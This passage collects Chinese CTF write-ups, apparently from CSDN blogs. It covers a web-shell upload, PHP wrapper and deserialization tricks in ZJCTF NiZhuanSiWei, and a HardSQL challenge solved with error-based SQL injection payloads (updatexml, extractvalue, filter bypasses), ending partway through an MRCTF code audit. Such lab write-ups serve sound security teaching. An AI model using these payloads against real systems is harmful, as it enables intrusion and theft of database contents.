再次上传1.jpg的木马文件<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699944965445-687f05af-adb8-4647-b282-ed3ffdac794f.png#averageHue=%23f8f7f7&clientId=u3b3bf35b-d4c8-4&from=paste&height=725&id=u2ac64e9c&originHeight=906&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=187867&status=done&style=none&taskId=u8cdd2426-2571-4743-aa16-6add598d1c2&title=&width=1374.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699945011943-6b907b56-7038-447e-8513-4ed54b64ae5c.png#averageHue=%23fcfcfb&clientId=u3b3bf35b-d4c8-4&from=paste&height=279&id=ud2d1c306&originHeight=349&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=36287&status=done&style=none&taskId=u2385075d-1bca-4f48-94f5-24971ffb98b&title=&width=1536)
> 上传成功
> 访问成功
> 尝试使用蚁剑进行连接

使用中国蚁剑进行连接<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699945157083-feb31adc-20b1-42f3-8cbe-151527982fd1.png#averageHue=%23f2f2f2&clientId=u3b3bf35b-d4c8-4&from=paste&height=864&id=u3e650151&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=109077&status=done&style=none&taskId=u6c148fe9-e78d-4a71-a3e1-c905dc4c98a&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699945192353-8efe2da0-59b5-480b-b443-1eb3c11a4365.png#averageHue=%23f3f3f3&clientId=u3b3bf35b-d4c8-4&from=paste&height=864&id=ua25681a3&originHeight=1080&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=145463&status=done&style=none&taskId=ub59ce843-a786-441c-9336-aacfb7e466b&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699945220372-50f9b7d4-12a7-4b13-91db-328bdc3c99c2.png#averageHue=%23efefee&clientId=u3b3bf35b-d4c8-4&from=paste&height=194&id=u692dda44&originHeight=243&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=26437&status=done&style=none&taskId=u92427d98-bf87-4f3b-96cc-c4473c39097&title=&width=1536)<br />**得到flag：**<br />`flag{11711c03-702e-43ac-b1fe-fec6c5297260}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134399554?spm=1001.2014.3001.5501

## 详解[ZJCTF 2019]NiZhuanSiWei 1（PHP两种伪协议、PHP反序列化漏洞、PHP强比较）还有那道题有这么经典？

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699963793416-8255475f-4de4-42a8-a718-f5d257ffad03.png#averageHue=%23fdfcfc&clientId=u01b9a614-d96f-4&from=paste&height=395&id=u31cb20af&originHeight=494&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=38416&status=done&style=none&taskId=u1295fa4f-23f4-42bc-bc3b-e491613d732&title=&width=1536)
```php
<?php  
  $text = $_GET["text"];
$file = $_GET["file"];
$password = $_GET["password"];
if(isset($text)&&(file_get_contents($text,'r')==="welcome to the zjctf")){
  echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
  if(preg_match("/flag/",$file)){
    echo "Not now!";
    exit(); 
  }else{
    include($file);  //useless.php
    $password = unserialize($password);
    echo $password;
  }
}
else{
  highlight_file(__FILE__);
}
?>
```
PHP代码审计
> 三个通过GET方式传参的参数text、file、password
> file_get_contents() 函数把整个文件读入一个字符串中。
> 'r'代表读取内容
> &&左右两边条件都要满足，===PHP强比较，类型和值都要相等
> 满足第一个参数就会输出这段字符串
> **从这里可以看出，需要用到PHP伪协议中的data协议**
> 第二个参数file就是遇到的就是**正则匹配，**flag关键字被过滤了
> 当出现flag关键字时，程序就会自动退出，不再进行
> 反之，如果绕过正则的话，就包含咱们传给file参数的文件
> 可以看出作者注释里面给的有一个文件，useless.php
> 下面是对password参数进行反序列化
> **从这里可以猜出，useless.php文件可能包含的是反序列化内容**
> 然后file参数和password参数联系起来就一目了然了（这里正则并没有用可以直接绕过）
> **猜测啊，file=useless.php，才能进入password参数那部分（后面可以给大家测试看看）**

作者很贴心，打开题目给的有题目源码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699965044018-857fad73-a207-45a2-9afe-7ee60e1b5a43.png#averageHue=%23fdfdfd&clientId=u01b9a614-d96f-4&from=paste&height=630&id=ub82948e1&originHeight=788&originWidth=622&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=61827&status=done&style=none&taskId=u521a75db-7e73-40ff-8400-91b72691748&title=&width=497.6)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699965130661-59a91f56-4889-4a05-b539-22443d218845.png#averageHue=%23fdfdfd&clientId=u01b9a614-d96f-4&from=paste&height=760&id=u6354e149&originHeight=950&originWidth=1911&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=101164&status=done&style=none&taskId=u3c5f7040-6a64-4392-a881-15fe5fe2906&title=&width=1528.8)<br />当然咱们还可以通过data伪协议和php://filter伪协议去查看useless.php的源码
> php://filter伪协议详解文末会给链接
> base64编解码文末也会给链接

data协议规则：<br />`data://text/plain;编码格式,读取内容`<br />（注意一个是分号;命令拼接，和一个逗号,用来读取文本内容）
> 如果要读取后边的文件内容，字符串也要进行相应的编码
> 这里猜测useless.php文件是base64编码格式
> 所以使用base64编码格式

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699965611693-234cb3de-f023-4340-8399-a3bbbdd978db.png#averageHue=%23fdfcfb&clientId=u01b9a614-d96f-4&from=paste&height=376&id=u65a787d8&originHeight=470&originWidth=1858&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45071&status=done&style=none&taskId=u0c80f959-788a-4c7d-b7bb-c32eabe0e90&title=&width=1486.4)<br />构造payload：<br />`?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&file=php://filter/read=convert.base64-encode/resource=useless.php`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699965852703-ae1533a3-6015-4eb6-b71e-6da7dc623e9a.png#averageHue=%23f9f8f6&clientId=u01b9a614-d96f-4&from=paste&height=280&id=u9d7af1f3&originHeight=350&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56822&status=done&style=none&taskId=u8666b584-ce35-4398-be63-a30d5c1a2aa&title=&width=1536)<br />送去base64解码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699965982123-ece08a80-a46d-4d32-9c72-e845665a4e7b.png#averageHue=%23fcfafa&clientId=u01b9a614-d96f-4&from=paste&height=377&id=u7b328f9c&originHeight=471&originWidth=1845&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=47736&status=done&style=none&taskId=u3d0e6401-de69-4d90-8be0-3a360e3317b&title=&width=1476)<br />useless.php源代码
```php
<?php  

class Flag{  //flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
}  
?> 
```
> 较为简单的序列化，直接给参数file赋值flag.php即可

进行序列化
```php
<?php  

class Flag{  //flag.php  
    public $file='flag.php';  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("U R SO CLOSE !///COME ON PLZ");
        }  
    }  
} 
$flag=new Flag();
echo serialize($flag);
?> 
```
![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699966288185-7fc5aaa8-c623-48ee-afc5-263257a7cc54.png#averageHue=%23232625&clientId=u01b9a614-d96f-4&from=paste&height=649&id=u6611dfff&originHeight=811&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=114364&status=done&style=none&taskId=u40f70be2-5673-411b-bd3d-17eacfc76ad&title=&width=1536)<br />构造最终payload：<br />`?text=data://text/plain,welcome to the zjctf&file=useless.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`<br />上传payload：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699966583634-9d1901c5-a16d-44bf-9b3b-572f71ff66d2.png#averageHue=%23fbfbfa&clientId=u01b9a614-d96f-4&from=paste&height=340&id=u37923332&originHeight=425&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42977&status=done&style=none&taskId=ua06582ee-4ae6-444f-abb8-1be54725b2b&title=&width=1536)
> 这里表明三个参数都已符合了条件

F12查看源码：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699966715532-732fe627-50d1-4ffc-8919-b2093c800e9a.png#averageHue=%23fbfafa&clientId=u01b9a614-d96f-4&from=paste&height=306&id=u920714f4&originHeight=382&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42431&status=done&style=none&taskId=u00dfb23c-9dd9-41af-a3fd-708484726c2&title=&width=1534.4)<br />**得到flag：**<br />`flag{8fa13eb3-db41-4230-be27-634236f2fe1b}`
> 这里再说明以下，为什么给file参数赋值useless.php，因为你进入了useless.php才能进入password参数那一步！
> 同时也绕过了正则

我们可以测试一下给file参数传inde.php文件会怎样<br />payload：<br />`?text=data://text/plain,welcome to the zjctf&file=index.php`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699966979949-90d34ebb-c2dc-42a2-ab6e-a69c3db20545.png#averageHue=%23fafafa&clientId=u01b9a614-d96f-4&from=paste&height=816&id=uae704717&originHeight=1020&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=93708&status=done&style=none&taskId=ue1dbd814-de24-40c9-9e24-5fef30914f9&title=&width=1536)<br />`?text=data://text/plain,welcome to the zjctf&file=index.php&password=O:4:"Flag":1:{s:4:"file";s:8:"flag.php";}`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1699967135889-5ed5ab4c-a19b-4a4a-95e7-472a70391083.png#averageHue=%23fafafa&clientId=u01b9a614-d96f-4&from=paste&height=826&id=uccd4524a&originHeight=1033&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105488&status=done&style=none&taskId=uf4977a7c-7a3f-49c7-8f0a-4b2a7048c70&title=&width=1536)
> 可以看出，当参数file赋值为index.php文件的时候，一直执行的是index代码内容
> 那么当参数file赋值为useless.php文件的时候，才会去执行参数password的内容

> **php://filter伪协议可参考：**[https://blog.csdn.net/m0_73734159/article/details/130383801?spm=1001.2014.3001.5501](https://blog.csdn.net/m0_73734159/article/details/130383801?spm=1001.2014.3001.5501)
> **PHP序列化魔法函数可参考：**[https://blog.csdn.net/m0_73734159/article/details/133854073?spm=1001.2014.3001.5502](https://blog.csdn.net/m0_73734159/article/details/133854073?spm=1001.2014.3001.5502)
> **PHP强比较可参考：**[**https://blog.csdn.net/m0_73734159/article/details/134349129?spm=1001.2014.3001.5501**](https://blog.csdn.net/m0_73734159/article/details/134349129?spm=1001.2014.3001.5501)
> **base64编码解码网站：**[https://c.runoob.com/front-end/693/](https://c.runoob.com/front-end/693/)
> **【Kali终端也可通过命令进行base64解码】（echo "bae64编码内容" | base64 -d）**

原文链接：https://blog.csdn.net/m0_73734159/article/details/134408344?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134408344%22%2C%22source%22%3A%22m0_73734159%22%7D

## 非常经典的一道SQL报错注入题目[极客大挑战 2019]HardSQL 1（两种解法！）

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700028192100-072fef37-e469-4344-87d7-0fed3ffefaf0.png#averageHue=%231f1e1e&clientId=u48b98de8-8a98-4&from=paste&height=788&id=iXSwb&originHeight=985&originWidth=1909&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=595618&status=done&style=none&taskId=u5b63bea1-1220-4822-b6ec-1efc65dfa3e&title=&width=1527.2)
> 没错，又是我，这群该死的黑客竟然如此厉害，所以我回去爆肝SQL注入，这次，再也没有人能拿到我的flag了
> 做了好多这个作者出的题了，看来又要上强度了

判断注入类型
> username：admin
> password：1
> **这里把参数password作为注入点**

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700114909235-b7dcf7bb-417c-4e3c-8ef5-a34d665354e9.png#averageHue=%23222020&clientId=ueddd42b1-c7c6-4&from=paste&height=734&id=u14beb817&originHeight=917&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=593759&status=done&style=none&taskId=u86855b31-980b-4f13-bab6-78d992b4ae7&title=&width=1536)<br />`1'`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700114953260-feaa1c75-a98f-4227-bde3-72181ac3e2c6.png#averageHue=%23222121&clientId=ueddd42b1-c7c6-4&from=paste&height=726&id=u3bc62ac0&originHeight=908&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=593365&status=done&style=none&taskId=u3d9a005a-7dd9-4f9c-83d1-086ad39e3c8&title=&width=1535.2)
> 单引号的字符型注入

万能密码注入<br />`1' or '1'='1`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115490244-e45bae46-05b7-4528-a421-2cef342d6943.png#averageHue=%23272424&clientId=ueddd42b1-c7c6-4&from=paste&height=642&id=u7452269d&originHeight=802&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=532693&status=done&style=none&taskId=u574043a9-5be8-47d6-9685-504a0945edc&title=&width=1536)
> 万能密码注入被链接
> 猜测某些字符或者关键字被过滤

SQL注入字典查过滤字符<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115657835-43204e90-7d3f-4af7-ac62-96c74ea0c8a8.png#averageHue=%23f9f9f9&clientId=ueddd42b1-c7c6-4&from=paste&height=750&id=uf1941041&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=149391&status=done&style=none&taskId=uf98b22f9-d8c4-4563-9bc3-6c4fd82b927&title=&width=1374.4)<br />Intruder字典爆破<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115719088-db4cf3aa-9990-4ff8-98aa-cf249c1753c7.png#averageHue=%23faf9f9&clientId=ueddd42b1-c7c6-4&from=paste&height=750&id=ud9f53580&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=117221&status=done&style=none&taskId=u5483c875-a79f-4e5e-b6da-8972aa72cd9&title=&width=1374.4)<br />光标选中参数password的值1-Add选择爆破目标![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115995428-128ae817-15d7-401a-b1b9-1939a49197d8.png#averageHue=%23f9f9f9&clientId=ueddd42b1-c7c6-4&from=paste&height=750&id=uef3caff1&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=104293&status=done&style=none&taskId=ufd00bf26-0c4a-4b13-a5de-debc83d619d&title=&width=1374.4)<br />选用字典<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115828530-08c47162-6a09-4dcf-ae7a-3177ca387950.png#averageHue=%23f8f7f7&clientId=ueddd42b1-c7c6-4&from=paste&height=750&id=u6f39ac02&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=117154&status=done&style=none&taskId=u2d6e7851-cef8-478f-bb99-3e30c704156&title=&width=1374.4)<br />Start attack开始爆破<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115886342-c23bf08d-5ec2-4e0c-9269-511a0a646a11.png#averageHue=%23f7f7f7&clientId=ueddd42b1-c7c6-4&from=paste&height=750&id=u59319188&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=105062&status=done&style=none&taskId=ub4dc8884-f85a-4292-9411-c5eba5f4244&title=&width=1374.4)<br />OK<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700115914796-8e6b4a95-84ab-4206-8dc5-c1cd33422d24.png#averageHue=%23f6f6f6&clientId=ueddd42b1-c7c6-4&from=paste&height=750&id=u4fb023bb&originHeight=938&originWidth=1718&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=111125&status=done&style=none&taskId=u563c4962-79e6-404e-b1e9-2014b6c7420&title=&width=1374.4)<br />爆破结果：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700116953369-bd42e81b-7182-4614-b706-77aa4ecc8010.png#averageHue=%23fbfaf9&clientId=ueddd42b1-c7c6-4&from=paste&height=864&id=u688ce8c1&originHeight=1080&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=124437&status=done&style=none&taskId=uf85357a2-11ea-4519-9f83-93a5c25ac3b&title=&width=1535.2)
> 741为过滤内容
> 可以看到很多字符=、--+、/**/和一些注入命令union、by、'1'='1等被过滤

继续测试
> admin
> 1' or

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700132653521-10291f28-ff0a-4054-b302-6103a47a38d2.png#averageHue=%23242323&clientId=u91492660-2dde-4&from=paste&height=689&id=ud7064c62&originHeight=861&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=569374&status=done&style=none&taskId=u32c775dd-83f0-4a7e-a782-8b1ccce9959&title=&width=1536)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700132761816-5369e015-9140-41d5-a8ab-44fcc6723dd0.png#averageHue=%23232121&clientId=u91492660-2dde-4&from=paste&height=669&id=uf3013809&originHeight=836&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=559525&status=done&style=none&taskId=u3b6dbc29-c831-4471-b863-af652ac7fba&title=&width=1535.2)
> 可以看到被拦截了
> 通过刚才的字典爆破，可以知道1'和or是没有被过滤的
> 那么真相只有一个，卧槽，空格被过滤了，我直呼好家伙

> 刚开始本想尝试编码绕过空格，结果不行，这里猜测到了空格限制

空格限制
> admin
> 1'(or)

![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700133483156-fe79b78c-1529-4a48-aefa-89ffc606bf29.png#averageHue=%23212121&clientId=u91492660-2dde-4&from=paste&height=714&id=ubb30a5c5&originHeight=892&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=593765&status=done&style=none&taskId=ude3e6d8b-2c67-4041-8cc6-fcc73b15f97&title=&width=1535.2)
> like没有被过滤，使用like可以绕过=号，like <=> =

**重新构造万能密码**<br />`1'or((1)like(1))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700136682992-e9c6edcc-7197-4ca4-b56c-cdeacc3cd842.png#averageHue=%23242423&clientId=u91492660-2dde-4&from=paste&height=721&id=u52300fd0&originHeight=901&originWidth=1919&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=588014&status=done&style=none&taskId=uf0801150-4190-4b8b-b46b-98c315b4b08&title=&width=1535.2)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700136703141-673d48cb-537c-4a3c-b55c-df35f4bb1ca5.png#averageHue=%23272524&clientId=u91492660-2dde-4&from=paste&height=434&id=u4682706c&originHeight=542&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=275712&status=done&style=none&taskId=u1f5be12b-185e-4491-b592-28bd3a178a0&title=&width=1534.4)
> 可以看到绕过了空格限制
> 同时也登陆成功了
> 然后想到了之前做过很类似的一道题
> SQL报错注入也用到了空格限制
> （已经试了堆叠注入和联合注入都不行）
> 这里就索性试一下SQL报错注入

**知识一、**
> SQL报错注入常用函数
> 
> 两个基于XPAT（XML)的报错注入函数
> 函数updatexml() 是mysql对xml文档数据进行查询和修改的xpath函数
> 函数extractvalue() 是mysql对xml文档数据进行查询的xpath函数
> 注入原理：
> （在使用语句时，如果XPath_string不符合该种类格式，就会出现格式错误，并且会以系统报错的形式提示出错误！）
> （局限性查询字符串长度最大为32位，要突破此限制可使用right(),left()，substr()来截取字符串）
> 
> 其它
> 函数floor() mysql中用来取整的函数
> 函数exp() 此函数返回e(自然对数的底)指数X的幂值的函数

**首先使用updatexml()函数进行SQL报错注入**<br />爆库<br />`1'or(updatexml(1,concat(0x7e,database(),0x7e),1))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700137062141-c6e84467-bc12-495a-bc13-3b34c42798e7.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=306&id=u2c59b5e2&originHeight=382&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=167622&status=done&style=none&taskId=uee57976c-5bac-47c2-8f2d-5f0118c8c01&title=&width=1524)
> 得到库名geek

查表<br />`1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700137193154-ac8dadf9-8383-4c75-81c3-6c39f002e0dc.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=293&id=u6277140c&originHeight=366&originWidth=1898&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=160341&status=done&style=none&taskId=u15a895f1-efa2-44ed-8ab8-461a9d72177&title=&width=1518.4)
> 得到数据表H4rDsq1

爆字段<br />`1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700137376657-c6f0d854-d9f6-4cd3-b953-49a5c87c5cdc.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=286&id=u11e854de&originHeight=357&originWidth=1896&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=152073&status=done&style=none&taskId=u3419a2c7-8376-4aef-ac11-c4f81eca4c3&title=&width=1516.8)
> 得到三个字段：id、username、password

查字段内容<br />`1'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700137581168-867dafa8-ff44-4c64-bdf2-4f25c239b011.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=280&id=uf93349e1&originHeight=350&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=151119&status=done&style=none&taskId=ue6eae8dd-872c-4970-ac14-c4e94384075&title=&width=1524)
> 得到前一半flag值flag{389c9161-c2eb-403a-80

使用right()突破字符限制<br />`1'or(updatexml(1,concat(0x7e,(select(group_concat((right(password,25))))from(H4rDsq1)),0x7e),1))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700137784195-578d14e9-7d3e-4c34-843e-19775c00c83d.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=311&id=uc732f577&originHeight=389&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=181987&status=done&style=none&taskId=ud122c64e-c490-44a1-bf6d-118ba251020&title=&width=1524)
> 得到后一段flag值b-403a-8062-80f219ca1c30}

**拼接得到最终flag：**<br />`flag{389c9161-c2eb-403a-8062-80f219ca1c30}`

**使用extractvalue()函数进行SQL报错注入**
> **知识：^这个符号可以绕过or的限制**
> **这两种函数大同小异，不再赘述**
> **当然也可以不使用^来绕过or限制，单一的()绕过空格限制也可以**
> **大家可以看下边进行对比学习**

`1'^extractvalue(1,concat(0x7e,(select(database()))))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138297318-dc683b1f-85b8-4d11-85f0-ed3a99f8fe9d.png#averageHue=%230f0f0f&clientId=u91492660-2dde-4&from=paste&height=584&id=u3a7892c4&originHeight=730&originWidth=1898&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=524678&status=done&style=none&taskId=ufeed9b2a-b28c-47bf-a38a-d87cc2fbb65&title=&width=1518.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138318294-da6c97f7-1a34-4502-bc26-17c3957be973.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=273&id=u277b14c4&originHeight=341&originWidth=1905&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=135176&status=done&style=none&taskId=u9c7e3b0b-1a7d-49f7-8124-b3f5a89d46d&title=&width=1524)<br />`1'or(extractvalue(1,concat(0x7e,(select(database())))))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138372482-9340e361-e3c8-46db-8e9b-78b59ae07513.png#averageHue=%230f0f0f&clientId=u91492660-2dde-4&from=paste&height=544&id=u2e6c5dd0&originHeight=680&originWidth=1903&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=491577&status=done&style=none&taskId=uf04c2e44-79ba-4f8a-9013-9f8da4b3e4d&title=&width=1522.4)<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138392507-e1c4f4ad-8f44-4f37-bf7a-e444b76a4393.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=282&id=u810ea59a&originHeight=353&originWidth=1903&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=147491&status=done&style=none&taskId=u5b3e12de-f72a-42d2-95a1-95a159aa198&title=&width=1522.4)
> 好了大家已经明显看到了^和()绕过不同限制的区别
> 那么下面就给大家一直演示^绕过or限制了（上一个updatexml()函数使用的是()绕过空格限制）

`1'^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('geek'))))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138734330-20db4985-cad7-4e64-96cf-bc2363dade82.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=278&id=u4e9491f1&originHeight=347&originWidth=1883&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=152024&status=done&style=none&taskId=u899840eb-346b-4cf0-a940-a7685c4bfd6&title=&width=1506.4)<br />`1'^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138814522-047d9b1a-d00b-4d98-9f3a-738755cb91c0.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=266&id=u4b758f6c&originHeight=332&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=132671&status=done&style=none&taskId=u601d5103-c494-4d4f-b570-c710107c948&title=&width=1519.2)<br />`1'^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700138895689-9ac1d5f0-054d-4da9-9369-c0bb525d19f8.png#averageHue=%23030202&clientId=u91492660-2dde-4&from=paste&height=261&id=u33ad1618&originHeight=326&originWidth=1899&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=133493&status=done&style=none&taskId=u7e79de24-3e1a-440a-8ffd-72e9a84ef2d&title=&width=1519.2)<br />使用right()突破字符限制<br />`1'^extractvalue(1,right(concat(0x7e,(select(group_concat(password))from(H4rDsq1))),30))#`<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700139057690-f5b75288-5af6-4c31-a513-80cc58099d0b.png#averageHue=%23030101&clientId=u91492660-2dde-4&from=paste&height=247&id=u2389919c&originHeight=309&originWidth=1897&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=112698&status=done&style=none&taskId=ud15248b3-84d3-4cec-84c0-fc27c77103a&title=&width=1517.6)<br />**拼接得到最终flag：**<br />`flag{389c9161-c2eb-403a-8062-80f219ca1c30}`

原文链接：https://blog.csdn.net/m0_73734159/article/details/134450773?csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22134450773%22%2C%22source%22%3A%22m0_73734159%22%7D

## BUUCTF [MRCTF2020]Ez_bypass 1

题目环境：<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700911535943-147a39ff-efb1-4f2f-878b-beb04ff8ab98.png#averageHue=%23f2f0ed&clientId=u2735342b-9b67-4&from=paste&height=174&id=u7249e796&originHeight=218&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=56193&status=done&style=none&taskId=u3b76bfc6-27d9-4002-8366-5cd393336d3&title=&width=1536)<br />F12查看源代码<br />![image.png](https://cdn.nlark.com/yuque/0/2023/png/36016220/1700911646282-517108e1-a56a-4edc-b948-ed0e28bd5e05.png#averageHue=%23fbfbfb&clientId=u2735342b-9b67-4&from=paste&height=677&id=u79c09b97&originHeight=846&originWidth=1918&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=59836&status=done&style=none&taskId=u98c30f2f-40a1-497d-bafe-0466afd9c78&title=&width=1534.4)
```php
I put something in F12 for you  
	include 'flag.php';  
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';  
if(isset($_GET['gg'])&&isset($_GET['id'])) {  
	$id=$_GET['id'];  
	$gg=$_GET['gg'];  
	if (md5($id) === md5($gg) && $id !== $gg) {  
		echo 'You got the first step';  
		if(isset($_POST['passwd'])) {  
			$passwd=$_POST['passwd'];  
			if (!is_numeric($passwd))  
			{  
				if($passwd==1234567)  
				{  
					echo 'Good Job!';  
					highlight_file('flag.php');  
					die('By Retr_0');  
				}  
				else  
				{  
					echo "can you think twice??";  
				}  
			}  
			else{  
				echo 'You can not get it !';  
			}  
		}  
		else{  
			die('only one way to get the flag');  
		}  
	}  
	else {  
		echo "You are not a real hacker!";  
	}  
}  
else{  
	die('Please input first');  
}  
}Please input first 
```
PHP代码审计
> 分析源码关键点
> 获取flag的思路：
> 需要满足两个条件：
> GET传参方式
